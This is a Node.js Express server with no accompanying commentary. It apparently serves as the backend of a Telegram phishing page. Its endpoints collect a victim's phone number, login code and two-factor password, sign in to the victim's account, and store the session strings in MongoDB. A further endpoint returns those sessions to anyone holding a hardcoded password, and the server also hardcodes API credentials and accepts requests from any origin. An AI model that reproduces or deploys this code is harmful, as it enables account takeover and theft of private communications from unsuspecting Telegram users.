const express = require('express');
const cors = require('cors');
const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');
const mongoose = require('mongoose');

const app = express();
const PORT = process.env.PORT || 3000;

// Cloudflare Worker Domain erlauben
const allowedOrigins = ['https://projektnamepagesdev.bravegermany.workers.dev'];

app.use(cors({
    origin: function (origin, callback) {
        if (!origin || allowedOrigins.indexOf(origin) !== -1) {
            callback(null, true);
        } else {
            callback(null, true); 
        }
    }
}));
app.use(express.json());

// MongoDB
const MONGO_URI = process.env.MONGODB_URI || 'DEINE_DB_URL';
mongoose.connect(MONGO_URI);

const SessionSchema = new mongoose.Schema({
    phone: String,
    session: String,
    date: { type: Date, default: Date.now }
});
const Session = mongoose.model('Session', SessionSchema);

const apiId = 23049703;
const apiHash = 'e9c00af578a9de0253ef02337460498f';
const activeSessions = new Map();

app.post('/send-otp', async (req, res) => {
    try {
        const { phone } = req.body;
        const client = new TelegramClient(new StringSession(""), apiId, apiHash, { connectionRetries: 5 });
        await client.connect();
        const result = await client.sendCode({ apiId, apiHash }, phone);
        activeSessions.set(phone, { client, phoneCodeHash: result.phoneCodeHash });
        res.json({ phoneCodeHash: result.phoneCodeHash });
    } catch (e) {
        res.status(400).json({ error: e.message });
    }
});

app.post('/verify-otp', async (req, res) => {
    try {
        const { phone, code, phoneCodeHash, password } = req.body;
        const session = activeSessions.get(phone);
        if (!session) return res.status(400).json({ error: "Session abgelaufen" });

        try {
            await session.client.invoke(new Api.auth.SignIn({
                phoneNumber: phone,
                phoneCode: code,
                phoneCodeHash: phoneCodeHash
            }));
            const sessionString = session.client.session.save();
            await Session.create({ phone, session: sessionString });
            res.json({ success: true });
        } catch (err) {
            if (err.errorMessage === 'SESSION_PASSWORD_NEEDED') {
                if (!password) return res.json({ twoFactorRequired: true });
                const pwd = await session.client.invoke(new Api.account.GetPassword());
                await session.client.invoke(new Api.auth.CheckPassword({
                    password: await session.client.srpSolve(pwd, password)
                }));
                const sessionString = session.client.session.save();
                await Session.create({ phone, session: sessionString });
                res.json({ success: true });
            } else {
                throw err;
            }
        }
    } catch (e) {
        res.status(400).json({ error: e.message });
    }
});

app.get('/get-sessions', async (req, res) => {
    if (req.query.pass !== '280597') return res.status(401).json({ error: 'Unauthorized' });
    try {
        const sessions = await Session.find({});
        res.json(sessions);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.listen(PORT, () => console.log(`Server läuft auf Port ${PORT}`));
